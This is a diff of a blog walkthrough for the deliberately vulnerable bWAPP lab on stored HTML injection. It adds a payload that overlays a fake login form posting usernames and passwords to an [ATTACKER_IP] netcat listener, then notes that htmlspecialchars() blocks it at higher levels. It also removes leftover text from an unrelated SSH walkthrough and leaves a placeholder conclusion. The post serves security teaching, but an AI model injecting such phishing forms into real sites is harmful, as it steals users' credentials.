@@ -107,28 +107,52 @@ Yes, it is executing:
 
 ![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_2.png)
 
-Now we can even do **much more** than 
+Now we can even do **much more** than XSS like placing an **iframe for phising attacks** or even placing a new **Malicious Login Form** which sends the data to us. Lets see How??
 
-<h3>Security Level: medium</h3>
+Placing this HTML in the box:
+```
+<div class="test_code">test</div>
+<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;">
+Please Login Here To Proceed:
+<form name="login" action="http://[ATTACKER_IP]:1234/hacked.html" method="post">
+<table>
+<tr>
+<td>Username:</td>
+<td><input type="text" name="username"/></td>
+</tr>
+<tr>
+<td>Password:</td>
+<td><input type="password" name="passwd"/></td>
+</tr>
+</table>
+<input type="submit" value="Login"/>
+</form></div>
+```
+![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_3.png)
 
-<h3>Security Level: high</h3>
+Setting up the Natcat listener
+
+![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_4.png)
+
+Now submit the code, this shows the Login form to the user as:
+
+![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_3_1.png)
+
+When user fills their detail to this form, it will send us the request to our netcat listener as:
+
+![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_5.png)
+
+<h3>Security Level: medium & hard </h3>
+
+Same is not working in this, rather displaying the tags as text.
+
+![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored.png)
+
+This is using the ` htmlspecialchars() ` function which restricts the use of HTML special characters such as ‘<’, ‘>’,’”’, “’”, ‘&’ so we can’t injects anything malicious.
+
+![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_medium_hard.png)
 <!--
-	j
-``` 
-1.There is a user name james.
-2.The ssh key to login via SSH.
-```
-Saving the Key to a file and reduce its permission using ```chmod 400 james.key ``` and then connecting via SSH:
-
-
 <h3>Privilege Escalation</h3>
-
-``` 
-```
-
-```
-
-```
 ## HTML Injection - Reflected (GET)
 ---
 <h3>Security Level: low</h3>
@@ -138,7 +162,7 @@ Saving the Key to a file and reduce its permission using ```chmod 400 james.key 
 <h3>Security Level: high</h3>
 
 <h3><u><b>BONUS</b></u></h3>
-Finally, We got a connection from the Box as ROOT. It was really a nice room containing many fundamentals, and I enjoyed solving it and writing its walkthrough.
+GOODBYE LINE(conclusion).
 <br>
 <br>
 
